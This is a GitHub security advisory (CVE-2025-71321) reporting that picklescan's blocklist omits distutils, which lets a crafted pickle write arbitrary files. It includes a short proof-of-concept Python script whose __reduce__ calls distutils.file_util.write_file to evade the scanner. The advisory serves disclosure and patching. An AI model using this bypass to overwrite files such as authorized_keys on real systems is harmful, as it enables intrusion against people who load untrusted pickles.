# [H] Picklescan vulnerable to Arbitrary File Writing

## Summary
Severity: High
Advisory: GHSA-m273-6v24-x4m4
CVE: CVE-2025-71321
CWE: CWE-502, CWE-552
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-12-29
Source: https://github.com/advisories/GHSA-m273-6v24-x4m4
Type: github-advisory

## Affected
- PyPI: `picklescan` — affected >=0 <0.0.33

## Details
### Summary
Picklescan has got open() and shutil in its default dangerous blocklist to prevent arbitrary file overwrites. However the module distutils isnt blocked and can be used for the same purpose ie to write arbitrary files.

### Details
This is another vulnerability which impacts the downstream user.

By constructing a pickle that user distutils.file_util.write_file, an attacker can overwrite critical system files (like .ssh/authorized_keys, web server configurations, or source code) to achieve DoS or escalate to RCE.

### PoC
```python
import pickle
import distutils.file_util

class FileWriteBypass:
    def __reduce__(self):
        
        target_file = "pwned_config.env"
        content = ["print('I have overwritten your config')"]
        
        return (distutils.file_util.write_file, (target_file, content))

payload = pickle.dumps(FileWriteBypass())
with open("bypass_filewrite.pkl", "wb") as f:
    f.write(payload)

print("bypass_filewrite.pkl")
```

<img width="853" height="197" alt="image" src="https://github.com/user-attachments/assets/a129f5aa-a050-4e88-adb7-5a6f93e35b65" />

To fix this just add disutil to the blacklist

## References
- https://github.com/mmaitre314/picklescan/security/advisories/GHSA-m273-6v24-x4m4
- https://nvd.nist.gov/vuln/detail/CVE-2025-71321
- https://github.com/mmaitre314/picklescan/pull/53
- https://github.com/mmaitre314/picklescan/commit/70c1c6c31beb6baaf52c8db1b6c3c0e84a6f9dab
- https://github.com/mmaitre314/picklescan
- https://github.com/mmaitre314/picklescan/releases/tag/v0.0.33
- https://www.vulncheck.com/advisories/picklescan-arbitrary-file-writing-via-distutils-module-bypass
